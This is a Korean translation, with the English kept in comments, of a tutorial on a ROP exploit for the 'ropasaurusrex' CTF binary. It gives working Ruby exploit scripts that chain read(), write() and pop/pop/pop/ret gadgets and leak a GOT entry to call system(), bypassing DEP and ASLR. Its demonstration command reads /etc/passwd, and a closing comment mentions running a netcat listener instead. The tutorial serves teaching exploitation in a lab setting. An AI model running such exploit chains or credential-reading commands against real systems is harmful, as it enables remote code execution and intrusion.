다음 단계는 주소 `0x08049530`에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리에게 무엇이 있는지 살펴보자.

``` sh
ron@debian-x86 ~ $ objdump -R ropasaurusrex

ropasaurusrex:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049600 R_386_GLOB_DAT    __gmon_start__
08049610 R_386_JUMP_SLOT   __gmon_start__
08049614 R_386_JUMP_SLOT   write
08049618 R_386_JUMP_SLOT   __libc_start_main
0804961c R_386_JUMP_SLOT   read
```

<!-- So, we have `read()` and `write()` immediately available. That's helpful! The `read()` function will read data from the socket and write it to memory. The prototype looks like this: -->
즉시 사용 가능한 `read()`와 `write()`를 찾았다. 이건 유용하다! `read()` 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이런 식일 것이다.

``` c
ssize_t read(int fd, void *buf, size_t count);
```

<!-- This means that, when you enter the `read()` function, you want the stack to look like this: -->
당신이 `read()` 함수에 진입했을 때, 이런 스택을 원할 것이다.

<!-- 
+----------------------+
|         ...          | - doesn't matter, other funcs will go here
+----------------------+

+----------------------+ <-- start of read()'s stack frame
|     size_t count     | - count, strlen("cat /etc/passwd")
+----------------------+
|      void *buf       | - writable memory, 0x08049530
+----------------------+
|        int fd        | - should be 'stdin' (0)
+----------------------+
|   [return address]   | - where 'read' will return
+----------------------+

+----------------------+
|         ...          | - doesn't matter, read() will use for locals
+----------------------+
 -->
``` text
+----------------------+
|         ...          | - 상관 없다. 다른 함수들이 여기 올 것이다.
+----------------------+

+----------------------+ <-- read()의 스택 프레임 시작
|     size_t count     | - count, strlen("cat /etc/passwd")
+----------------------+
|      void *buf       | - 쓸 수 있는(writable) memory, 0x08049530
+----------------------+
|        int fd        | - 'stdin' (0)이어야 한다.
+----------------------+
|   [return address]   | - 'read'가 반환할 곳
+----------------------+

+----------------------+
|         ...          | - 상관 없다. read()가 지역 변수를 위해 사용할 것이다.
+----------------------+
```

<!-- We update our exploit to look like this (explanations are in the comments): -->
익스플로잇을 이렇게 업데이트 하자(설명은 주석에 있다).

``` ruby
$ cat sploit.rb
require 'socket'

s = TCPSocket.new("localhost", 4444)

# The command we'll run
cmd = ARGV[0] + "\0"

# From objdump -x
buf = 0x08049530

# From objdump -D ./ropasaurusrex | grep read
read_addr = 0x0804832C
# From objdump -D ./ropasaurusrex | grep write
write_addr = 0x0804830C

# Generate the payload
payload = "A"*140 +
  [
    cmd.length, # number of bytes
    buf,        # writable memory
    0,          # stdin
    0x43434343, # read's return address

    read_addr # Overwrite the original return
  ].reverse.pack("I*") # Convert a series of 'ints' to a string

# Write the 'exploit' payload
s.write(payload)

# When our payload calls read() the first time, this is read
s.write(cmd)

# Clean up
s.close()
```

<!-- We run that against the target: -->
공격 대상에 실행해 보자.

``` sh
ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
```

<!-- And verify that it crashes: -->
그리고 크래시를 일으키는 걸 확인해라.

``` sh
listening on [any] 4444 ...
connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53456
Segmentation fault (core dumped)
```

<!-- Then verify that it crashed at the return address of `read()` (`0x43434343`) and wrote the command to the memory at `0x08049530`: -->
그게 `read()`의 반환 주소(`0x43434343`)에서 크래시를 일으켰고 명령어를 메모리 `0x08049530`에 썼다는 걸 확인해라.

``` sh
$ gdb --quiet ./ropasaurusrex core
[...]
Program terminated with signal 11, Segmentation fault.
#0  0x43434343 in ?? ()
(gdb) x/s 0x08049530
0x8049530:       "cat /etc/passwd"
```

<!-- Perfect! -->
완벽하다!

<!-- ### Running it -->

### <a id="running-it"></a>실행하기

<!-- Now that we've written `cat /etc/passwd` into memory, we need to call `system()` and point it at that address. It turns out, if we assume ASLR is off, this is easy. We know that the executable is linked with libc: -->
이제 우린 `cat /etc/passwd`를 메모리에 썼고, `system()`을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다.

``` sh
$ ldd ./ropasaurusrex
        linux-gate.so.1 =>  (0xb7703000)
        libc.so.6 => /lib/i686/cmov/libc.so.6 (0xb75aa000)
        /lib/ld-linux.so.2 (0xb7704000)
```

<!-- And `libc.so.6` contains the `system()` function: -->
그리고 `libc.so.6`엔 `system()` 함수가 포함되어 있다.

``` sh
$ objdump -T /lib/i686/cmov/libc.so.6 | grep system
000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
00039450  w   DF .text  0000007d  GLIBC_2.0   system
```

<!-- We can figure out the address where `system()` ends up loaded in ropasaurusrex in our debugger: -->
디버거를 통해 ropasaurusrex에서 로드된 `system()` 주소를 알아낼 수 있다.

``` sh
$ gdb --quiet ./ropasaurusrex core
[...]
Program terminated with signal 11, Segmentation fault.
#0  0x43434343 in ?? ()
(gdb) x/x system
0xb7ec2450 <system>:    0x890cec83
```

<!-- Because `system()` only takes one argument, building the stackframe is pretty easy: -->
`system()`은 인자를 하나만 받으므로, 스택 프레임을 만드는 건 쉬운 편이다.

<!-- 
+----------------------+
|         ...          | - doesn't matter, other funcs will go here
+----------------------+

+----------------------+ <-- Start of system()'s stack frame
|      void *arg       | - our buffer, 0x08049530
+----------------------+
|   [return address]   | - where 'system' will return
+----------------------+
|         ...          | - doesn't matter, system() will use for locals
+----------------------+
 -->
``` text
+----------------------+
|         ...          | - 상관 없다. 다른 함수들이 여기 올 것이다.
+----------------------+

+----------------------+ <-- system()의 스택 프레임 시작
|      void *arg       | - buffer, 0x08049530
+----------------------+
|   [return address]   | - 'system'이 반환되는 주소
+----------------------+
|         ...          | - 상관 없다. system() 지역 변수를 위해 사용할 것이다.
+----------------------+
```

<!-- Now if we stack this on top of our `read()` frame, things are looking pretty good: -->
이제 이걸 `read()` 프레임 위에 쌓으면 제법 괜찮아 보인다.

<!-- 
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s stack frame
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of system]  | <-- Stack pointer
+----------------------+

+----------------------+
|         ...          |
+----------------------+
 -->
``` text
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()의 스택 프레임 시작
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- read()의 프레임 시작
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of system]  | <-- 스택 포인터
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

<!-- At the moment that `read()` returns, the stack pointer is in the location shown above. When it returns, it pops `read()`'s return address off the stack and jumps to it. When it does, this is what the stack looks like when `read()` returns: -->
`read()`가 반환하는 순간, 스택 포인터의 위치는 위에 나타낸 대로다. `read()`가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 반환하면 스택은 이렇게 보일 것이다.

<!-- 
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        | <-- Stack pointer
+----------------------+
| [address of system]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
 -->
``` text
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()의 프레임 시작
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- read()의 프레임 시작
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        | <-- 스택 포인터
+----------------------+
| [address of system]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

<!-- Uh oh, that's no good! The stack pointer is pointing to the middle of `read()`'s frame when we enter `system()`, not to the bottom of `system()`'s frame like we want it to! What do we do? -->
어라, 이건 좋지 않다! `system()`에 진입할 때, 스택 포인터는 우리가 원하는 `system()` 프레임 바닥이 아닌 `read()` 프레임의 안쪽을 가리키고 있다. 어떻게 해야 할까?

<!-- Well, when perform a ROP exploit, there's a very important construct we need called `pop/pop/ret`. In this case, it's actually `pop/pop/pop/ret`, which we'll call "pppr" for short. Just remember, it's enough "pops" to clear the stack, followed by a return. -->
사실, ROP 익스플로잇을 수행할 때, `pop/pop/ret`이라는 굉장히 중요한 구조가 있다. 이 경우엔 `pop/pop/pop/ret`이며 이걸 줄여 "pppr"이라고 하자. 스택을 비우기에 충분한 "pop"들 뒤에 return이라는 것만 기억해라.

<!-- `pop/pop/pop/ret` is a construct that we use to remove the stuff we don't want off the stack. Since `read()` has three arguments, we need to pop all three of them off the stack, then return. To demonstrate, here's what the stack looks like immediately after `read()` returns to a `pop/pop/pop/ret`: -->
스택에서 원하지 않는 것들을 지우기 위해 `pop/pop/pop/ret`을 사용한다. `read()`는 인자를 3개 받으므로, 우린 스택에서 그 셋을 모두 뽑은 다음 반환해야 한다. 설명을 위해 `read()`가 `pop/pop/pop/ret`으로 반환한 직후의 스택을 그려보자면 이렇다.

<!-- 
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- Special frame for pop/pop/pop/ret
| [address of system]  |
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        | <-- Stack pointer
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
 -->
``` text
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()의 프레임 시작
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret을 위한 특별한 프레임
| [address of system]  |
+----------------------+

+----------------------+ <-- read()의 프레임 시작
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        | <-- 스택 포인터
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

<!-- After "pop/pop/pop/ret" runs, but before it returns, we get this: -->
"pop/pop/pop/ret"이 실행되고, 반환하기 직전엔 다음과 같다.

<!-- 
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame
| [address of system]  | <-- stack pointer
+----------------------+

+----------------------+
|     size_t count     | <-- read()'s frame
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
 -->
``` text
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()의 프레임 시작
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret의 프레임
| [address of system]  | <-- 스택 포인터
+----------------------+

+----------------------+
|     size_t count     | <-- read()의 프레임
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

<!-- Then when it returns, we're exactly where we want to be: -->
반환하고 나면, 정확히 우리가 원하는 것을 얻을 수 있다.

<!-- 
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       |
+----------------------+
|   [return address]   | <-- stack pointer
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame
| [address of system]  |
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
 -->
``` text
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()의 프레임 시작
|      void *arg       |
+----------------------+
|   [return address]   | <-- 스택 포인터
+----------------------+

+----------------------+ <-- pop/pop/pop/ret의 프레임
| [address of system]  |
+----------------------+

+----------------------+ <-- read()의 프레임 시작
|     size_t count     |
+----------------------+
|      void *buf       |
+----------------------+
|        int fd        |
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

<!-- Finding a `pop/pop/pop/ret` is pretty easy using `objdump`: -->
`pop/pop/pop/ret`은 `objdump`를 이용하면 어렵지 않게 찾을 수 있다.

``` sh
$ objdump -d ./ropasaurusrex | egrep 'pop|ret'
[...]
 80484b5:       5b                      pop    ebx
 80484b6:       5e                      pop    esi
 80484b7:       5f                      pop    edi
 80484b8:       5d                      pop    ebp
 80484b9:       c3                      ret
```

<!-- This lets us remove between 1 and 4 arguments off the stack before executing the next function. Perfect! -->
이건 다음 함수를 실행할 때 1~4개의 인자를 스택에서 지울 수 있게 해준다. 완벽하다!

<!-- And remember, if you're doing this yourself, ensure that the pops are at consecutive addresses. Using `egrep` to find them can be a little dangerous like that. -->
그리고 이걸 직접 따라해 보고 있다면, pop들이 연속한 주소에 있어야 한다는 걸 기억해라. 그래서 `egrep`으로 찾는 것은 약간 위험하다.

<!-- So now, if we want a triple `pop` and a `ret` (to remove the three arguments that `read()` used), we want the address `0x80484b6`, so we set up our stack like this: -->
이제 우리는 `read()`가 사용한 세 개의 인자를 지울 세 개의 `pop`과 `ret`이 필요하면 주소 `0x80484b6`을 사용하면 될 것이다. 그러면 스택은 이렇게 될 것이다.

<!-- 
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       | - 0x08049530 (buf)
+----------------------+
|   [return address]   | - 0x44444444
+----------------------+

+----------------------+
| [address of system]  | - 0xb7ec2450
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     | - strlen(cmd)
+----------------------+
|      void *buf       | - 0x08049530 (buf)
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  | - 0x080484b6
+----------------------+

+----------------------+
|         ...          |
+----------------------+
 -->
``` text
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()의 프레임 시작
|      void *arg       | - 0x08049530 (buf)
+----------------------+
|   [return address]   | - 0x44444444
+----------------------+

+----------------------+
| [address of system]  | - 0xb7ec2450
+----------------------+

+----------------------+ <-- read()의 프레임 시작
|     size_t count     | - strlen(cmd)
+----------------------+
|      void *buf       | - 0x08049530 (buf)
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  | - 0x080484b6
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

<!-- We also update our exploit with a `s.read()` at the end, to read whatever data the remote server sends us. The current exploit now looks like: -->
원격 서버에서 보내는 걸 받기 위해 `s.read()`를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다.

``` ruby
require 'socket'

s = TCPSocket.new("localhost", 4444)

# The command we'll run
cmd = ARGV[0] + "\0"

# From objdump -x
buf = 0x08049530

# From objdump -D ./ropasaurusrex | grep read
read_addr = 0x0804832C
# From objdump -D ./ropasaurusrex | grep write
write_addr = 0x0804830C
# From gdb, "x/x system"
system_addr = 0xb7ec2450
# From objdump, "pop/pop/pop/ret"
pppr_addr = 0x080484b6

# Generate the payload
payload = "A"*140 +
  [
    # system()'s stack frame
    buf,         # writable memory (cmd buf)
    0x44444444,  # system()'s return address

    # pop/pop/pop/ret's stack frame
    system_addr, # pop/pop/pop/ret's return address

    # read()'s stack frame
    cmd.length,  # number of bytes
    buf,         # writable memory (cmd buf)
    0,           # stdin
    pppr_addr,   # read()'s return address

    read_addr # Overwrite the original return
  ].reverse.pack("I*") # Convert a series of 'ints' to a string

# Write the 'exploit' payload
s.write(payload)

# When our payload calls read() the first time, this is read
s.write(cmd)

# Read the response from the command and print it to the screen
puts(s.read)

# Clean up
s.close()
```

<!-- And when we run it, we get the expected result: -->
그리고 실행하게 되면, 예상대로 나온다.

``` sh
$ ruby sploit.rb "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
...
```

<!-- And if you look at the [core dump][], you'll see it's crashing at `0x44444444` as expected. -->
그리고 [코어 덤프][core dump]를 보면, 예상한 대로 `0x44444444`에서 크래시를 일으킨다.

[core dump]: https://en.wikipedia.org/wiki/Core_dump

<!-- Done, right? -->
끝났다, 그렇지?

<!-- WRONG! -->
실은 틀렸다!

<!-- This exploit worked perfectly against my test machine, but when ASLR is enabled, it failed: -->
이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다.

``` sh
$ sudo sysctl -w kernel.randomize_va_space=1
kernel.randomize_va_space = 1
ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
```

<!-- This is where it starts to get a little more complicated. Let's go! -->
여기서부터 조금 더 복잡해진다. 가보자!

<!-- ## What is ASLR? -->

## <a id="what-is-aslr"></a>ASLR이 뭐야?

<!-- ASLR---or address space layout randomization---is a defense implemented on all modern systems (except for FreeBSD) that randomizes the address that libraries are loaded at. As an example, let's run ropasaurusrex twice and get the address of `system()`: -->
ASLR(주소 공간 레이아웃 불규칙화(address space layout randomization))은 FreeBSD를 제외한 현대 시스템에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙하게 바꾼다. 그 예로, ropasaurusrex를 두 번 실행하고 `system()`의 주소를 알아내 보자.

``` sh
ron@debian-x86 ~ $ perl -e 'printf "A"x1000' | ./ropasaurusrex
Segmentation fault (core dumped)
ron@debian-x86 ~ $ gdb ./ropasaurusrex core
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/x system
0xb766e450 <system>:    0x890cec83

ron@debian-x86 ~ $ perl -e 'printf "A"x1000' | ./ropasaurusrex
Segmentation fault (core dumped)
ron@debian-x86 ~ $ gdb ./ropasaurusrex core
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/x system
0xb76a7450 <system>:    0x890cec83
```

<!-- Notice that the address of `system()` changes from `0xb766e450` to `0xb76a7450`. That's a problem! -->
`system()`의 주소가 `0xb766e450`에서 `0xb76a7450`으로 바뀐 것을 보라. 이게 문제다!

<!-- ## Defeating ASLR -->
## <a id="defeating-aslr"></a>ASLR 정복

<!-- So, what do we know? Well, the binary itself isn't ASLRed, which means that we can rely on every address in it to stay put, which is useful. Most importantly, the relocation table will remain at the same address: -->
그래서 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다.

``` sh
$ objdump -R ./ropasaurusrex

./ropasaurusrex:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049600 R_386_GLOB_DAT    __gmon_start__
08049610 R_386_JUMP_SLOT   __gmon_start__
08049614 R_386_JUMP_SLOT   write
08049618 R_386_JUMP_SLOT   __libc_start_main
0804961c R_386_JUMP_SLOT   read
```

<!-- So we know the address---in the binary---of `read()` and `write()`. What's that mean? Let's take a look at their values while the binary is running: -->
이렇게 바이너리 안에 있는 `read()`와 `write()`의 주소를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자.

``` sh
$ gdb ./ropasaurusrex
(gdb) run
^C
Program received signal SIGINT, Interrupt.
0xb7fe2424 in __kernel_vsyscall ()
(gdb) x/x 0x0804961c
0x804961c:      0xb7f48110
(gdb) print read
$1 = {<text variable, no debug info>} 0xb7f48110 <read>
```

<!-- Well look at that.. a pointer to `read()` at a memory address that we know! What can we do with that, I wonder...? I'll give you a hint: we can use the `write()` function---which we also know---to grab data from arbitrary memory and write it to the socket. -->
보라... `read()`를 가리키는 포인터가 우리가 알고 있는 메모리 주소에 있다! 이걸로 뭘 할지 궁금한가...? 힌트를 하나 주겠다. 우리는 역시 주소를 알고 있는 `write()` 함수를 사용해 임의의 메모리에서 데이터를 가져와 소켓에 쓸 수 있다.

<!-- ## Finally, running some code! -->

## <a id="finally-running-some-code"></a>드디어, 코드 실행!

<!-- Okay, let's break, this down into steps. We need to: -->
좋다, 잠깐 멈추고, 단계를 나누자. 우리는 이와 같은 과정이 필요하다.

<!-- 1. Copy a command into memory using the `read()` function.
2. Get the address of the `write()` function using the `write()` function.
3. Calculate the offset between `write()` and `system()`, which lets us get the address of `system()`.
4. Call `system()`. -->
1. `read()` 함수를 이용해 명령어를 메모리에 복사
2. `write()` 함수를 이용해 `write()` 함수의 주소 구하기
3. `system()` 주소를 구하기 위해 `write()`과 `system()`의 오프셋 계산
4. `system()` 호출

<!-- To call `system()`, we're gonna have to write the address of `system()` somewhere in memory, then call it. The easiest way to do that is to overwrite the call to `read()` in the `.plt` table, then call `read()`. -->
`system()`을 호출하려면, `system()`의 주소를 메모리 어딘가에 쓰고, 그걸 호출해야 한다. 가장 쉬운 방법은 `.plt` 테이블의 `read()` 호출을 덮어쓰고 `read()`를 호출하는 것이다.

<!-- By now, you're probably confused. Don't worry, I was too. I was shocked I got this working. :) -->
지금 아마도 조금 혼란스러울 것이다. 하지만 나도 그랬으니 걱정하지 마라. 난 이게 된다는 사실에 충격받았다. :)

<!-- Let's just go for broke now and get this working! Here's the stack frame we want: -->
잠시 멈추고 이걸 이해해 보자! 이건 우리가 원하는 스택 프레임일 것이다.

<!-- 
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()'s frame [7]
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame [6]
|  [address of read]   | - this will actually jump to system()
+----------------------+

+----------------------+ <-- second read()'s frame [5]
|     size_t count     | - 4 bytes (the size of a 32-bit address)
+----------------------+
|      void *buf       | - pointer to read() so we can overwrite it
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame [4]
|  [address of read]   |
+----------------------+

+----------------------+ <-- write()'s frame [3]
|     size_t count     | - 4 bytes (the size of a 32-bit address)
+----------------------+
|      void *buf       | - The address containing a pointer to read()
+----------------------+
|        int fd        | - 1 (stdout)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame [2]
|  [address of write]  |
+----------------------+

+----------------------+ <-- read()'s frame [1]
|     size_t count     | - strlen(cmd)
+----------------------+
|      void *buf       | - writeable memory
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
 -->
``` text
+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()의 프레임 [7]
|      void *arg       |
+----------------------+
|   [return address]   |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret의 프레임 [6]
|  [address of read]   | - 사실은 system()으로 점프할 것이다.
+----------------------+

+----------------------+ <-- 두 번째 read()의 프레임 [5]
|     size_t count     | - 4바이트 (32비트 주소의 크기)
+----------------------+
|      void *buf       | - read()를 가리키는 덮어쓸 수 있는 포인터
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret의 프레임 [4]
|  [address of read]   |
+----------------------+

+----------------------+ <-- write()의 프레임 [3]
|     size_t count     | - 4바이트 (32비트 주소의 크기)
+----------------------+
|      void *buf       | - read()를 가리키는 포인터를 포함하는 주소
+----------------------+
|        int fd        | - 1 (stdout)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret의 프레임 [2]
|  [address of write]  |
+----------------------+

+----------------------+ <-- read()의 프레임 [1]
|     size_t count     | - strlen(cmd)
+----------------------+
|      void *buf       | - 쓸 수 있는 메모리
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

<!-- Holy smokes, what's going on!? -->
오 이런, 이게 대체 뭐야?

<!-- Let's start at the bottom and work our way up! I tagged each frame with a number for easy reference. -->
바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.

<!-- Frame [1] we've seen before. It writes `cmd` into our writable memory. Frame [2] is a standard `pop/pop/pop/ret` to clean up the `read()`. -->
프레임 [1]은 전에 본 것이다. `cmd`를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 `read()`를 정리할 표준적인 `pop/pop/pop/ret`을 사용한다.

<!-- Frame [3] uses `write()` to write the address of the `read()` function to the socket. Frame [4] uses a standard `pop/pop/pop/ret` to clean up after `write()`. -->
프레임 [3]은 `write()`를 사용해 소켓에 `read()` 주소를 쓴다. 프레임 [4]는 `write()` 후 정리할 표준적인 `pop/pop/pop/ret`을 사용한다.

<!-- Frame [5] reads another address over the socket and writes it to memory. This address is going to be the address of the `system()` call. The reason writing it to memory works is because of how `read()` is called. Take a look at the `read()` call we've been using in gdb (`0x0804832C`) and you'll see this: -->
프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 `system()` 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 `read()`가 호출되는 방식 때문이다. 우리가 gdb (`0x0804832C`)에서 써 왔던 `read()` 호출 부분을 보면 이렇다.

``` sh
(gdb) x/i 0x0804832C
0x804832c <read@plt>:   jmp    DWORD PTR ds:0x804961c
```

<!-- `read()` is actually implemented as an indirect jump! So if we can change what `ds:0x804961c`'s value is, and still jump to it, then we can jump anywhere we want! So in frame [3] we read the address from memory (to get the actual address of `read()`) and in frame [5] we write a new address there. -->
`read()`는 사실 간접적인 점프로 구현되어 있다! 그러니 `ds:0x804961c`의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (`read()`의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.

<!-- Frame [6] is a standard `pop/pop/pop/ret` construct, with a small difference: the return address of the `pop/pop/pop/ret` is `0x804832c`, which is actually `read()`'s `.plt` entry. Since we overwrote `read()`'s `.plt` entry with `system()`, this call actually goes to `system()`! -->
프레임 [6]은 표준적인 `pop/pop/pop/ret` 구조지만 약간 다르다. `pop/pop/pop/ret`의 반환 주소가 실제론 `read()`의 `.plt` 엔트리인 `0x804832c`다. `read()`의 `.plt` 엔트리를 `system()`으로 덮어쓰기 때문에, 이 호출은 실제로 `system()`으로 가게 된다!

<!-- ## Final code -->

## <a id="final-code"></a>최종 코드

<!-- Whew! That's quite complicated. Here's code that implements the full exploit for ropasaurusrex, bypassing both DEP and ASLR: -->
휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다.

``` ruby
require 'socket'

s = TCPSocket.new("localhost", 4444)

# The command we'll run
cmd = ARGV[0] + "\0"

# From objdump -x
buf = 0x08049530

# From objdump -D ./ropasaurusrex | grep read
read_addr = 0x0804832C
# From objdump -D ./ropasaurusrex | grep write
write_addr = 0x0804830C
# From gdb, "x/x system"
system_addr = 0xb7ec2450
# Fram objdump, "pop/pop/pop/ret"
pppr_addr = 0x080484b6

# The location where read()'s .plt entry is
read_addr_ptr = 0x0804961c

# The difference between read() and system()
# Calculated as  read (0xb7f48110) - system (0xb7ec2450)
# Note: This is the one number that needs to be calculated using the
# target version of libc rather than my own!
read_system_diff = 0x85cc0

# Generate the payload
payload = "A"*140 +
  [
    # system()'s stack frame
    buf,         # writable memory (cmd buf)
    0x44444444,  # system()'s return address

    # pop/pop/pop/ret's stack frame
    # Note that this calls read_addr, which is overwritten by a pointer
    # to system() in the previous stack frame
    read_addr,   # (this will become system())

    # second read()'s stack frame
    # This reads the address of system() from the socket and overwrites
    # read()'s .plt entry with it, so calls to read() end up going to
    # system()
    4,           # length of an address
    read_addr_ptr, # address of read()'s .plt entry
    0,           # stdin
    pppr_addr,   # read()'s return address

    # pop/pop/pop/ret's stack frame
    read_addr,

    # write()'s stack frame
    # This frame gets the address of the read() function from the .plt
    # entry and writes to to stdout
    4,           # length of an address
    read_addr_ptr, # address of read()'s .plt entry
    1,           # stdout
    pppr_addr,   # retrurn address

    # pop/pop/pop/ret's stack frame
    write_addr,

    # read()'s stack frame
    # This reads the command we want to run from the socket and puts it
    # in our writable "buf"
    cmd.length,  # number of bytes
    buf,         # writable memory (cmd buf)
    0,           # stdin
    pppr_addr,   # read()'s return address

    read_addr # Overwrite the original return
  ].reverse.pack("I*") # Convert a series of 'ints' to a string

# Write the 'exploit' payload
s.write(payload)

# When our payload calls read() the first time, this is read
s.write(cmd)

# Get the result of the first read() call, which is the actual address of read
this_read_addr = s.read(4).unpack("I").first

# Calculate the address of system()
this_system_addr = this_read_addr - read_system_diff

# Write the address back, where it'll be read() into the correct place by
# the second read() call
s.write([this_system_addr].pack("I"))

# Finally, read the result of the actual command
puts(s.read())

# Clean up
s.close()
```

<!-- And here it is in action: -->
그리고 실행 결과다:

``` sh
$ ruby sploit.rb "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
[...]
```

<!-- You can, of course, change `cat /etc/passwd` to anything you want (including a netcat listener!) -->
